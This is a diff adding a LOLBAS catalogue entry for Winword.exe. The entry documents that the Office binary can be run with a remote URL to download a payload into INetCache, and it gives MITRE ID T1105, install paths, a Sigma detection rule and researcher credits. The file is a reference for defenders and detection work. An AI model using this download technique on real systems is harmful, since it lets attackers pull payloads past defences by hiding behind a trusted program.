@@ -1,0 +1,42 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OtherMSBinaries/Winword.yml -->
+---
+Name: Winword.exe
+Description: Microsoft Office binary
+Author: 'Reegun J (OCBC Bank)'
+Created: 2019-07-19
+Commands:
+  - Command: winword.exe {REMOTEURL}
+    Description: Downloads payload from remote server
+    Usecase: It will download a remote payload and place it in INetCache.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: C:\Program Files\Microsoft Office\root\Office16\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe
+  - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office16\winword.exe
+  - Path: C:\Program Files\Microsoft Office\Office16\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe
+  - Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office15\winword.exe
+  - Path: C:\Program Files\Microsoft Office\Office15\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe
+  - Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office14\winword.exe
+  - Path: C:\Program Files\Microsoft Office\Office14\winword.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office12\winword.exe
+  - Path: C:\Program Files\Microsoft Office\Office12\winword.exe
+  - Path: C:\Program Files\Microsoft Office\Office12\winword.exe
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml
+  - IOC: Suspicious Office application Internet/network traffic
+Resources:
+  - Link: https://twitter.com/reegun21/status/1150032506504151040
+  - Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
+Acknowledgement:
+  - Person: 'Reegun J (OCBC Bank)'
+    Handle: '@reegun21'
